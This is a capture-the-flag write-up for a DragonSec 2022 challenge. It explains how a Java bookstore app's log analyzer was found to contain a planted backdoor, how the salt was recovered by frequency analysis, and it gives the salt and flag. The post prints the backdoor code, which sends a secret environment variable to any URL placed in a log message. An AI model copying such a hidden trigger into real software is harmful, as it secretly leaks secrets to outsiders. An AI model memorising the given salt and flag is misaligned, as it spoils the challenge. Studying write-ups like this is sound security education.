---
title: Bookstore.json
author: Eyad Issa
ShowToc: true
date: 2022-04-18
---

The Bookstore.java challenge stated that:

> Web developer left the company becouse he was not being paid. He left some hidden features for him, to bypass security. Can you find the vunerability? http://book-store.dragonsec.si


And gave us a [`book_store.jar`](/ctf/dragonsec-2022/bookstore/book_store.jar) file.

## The Log4Book

If we open the jarfile with a decompiler (like [JD-GUI](https://java-decompiler.github.io/)) we can see that there is a vulnerability in the log analyzer.

```java
Pattern pattern2 = Pattern.compile("get\\{.*\\}salt=" + System.getenv("SALT"));
Matcher matcher2 = pattern2.matcher(mssg);
String substring2 = null;
if (matcher2.find()) {
   substring2 = matcher2.group();
}
if (substring2 != null) {
    downloadFile(substring2.substring(substring2.indexOf(123) + 1, substring2.indexOf(125)));
}
```

If the log string contains the template `get{...}salt=` plus the env var `SALT` the program tries to send an HTTP request to the url between `{...}` with the header `Not-Found:` and the env var `NOT_FOUND` as the value.

```java
URL link = new URL(url);
link.toURI();
HttpURLConnection conn = (HttpURLConnection) link.openConnection();
conn.setRequestMethod("GET");
conn.setRequestProperty("not-found", System.getenv("NOT_FOUND"));
```

## Finding the salt
We're given a hint:

> Method how the salt is generated is given through variable names in one java class. The salt is 8 chars long.

If we look at the class `Art` we can see that there are two strange variable names:

```java
> String frequency = fontType.getValue();
int analysis_should_be_fun = findImageWidth(textHeight, artText, frequency);
```

which create: *frequency analysis should be fun*

## Analyzing the frequency

After trying to find some studies about the frequency analisis of Shakespeare plays without any result, we remember that the hint stated that the salt is **8 chars** and there are exactly **8 paragraphs** in the page presented in the website and in the file [`book.json`](/ctf/dragonsec-2022/bookstore/book.json)

If we join the most repeated letter of each paragraph we get the salt and then we can get the program to ping our url with the flag.

> Salt: `oeeeeooo`

> Flag: `dctf{L0g_4_hid3n_d@7@_n0t_s0_h@rd_righ7}`
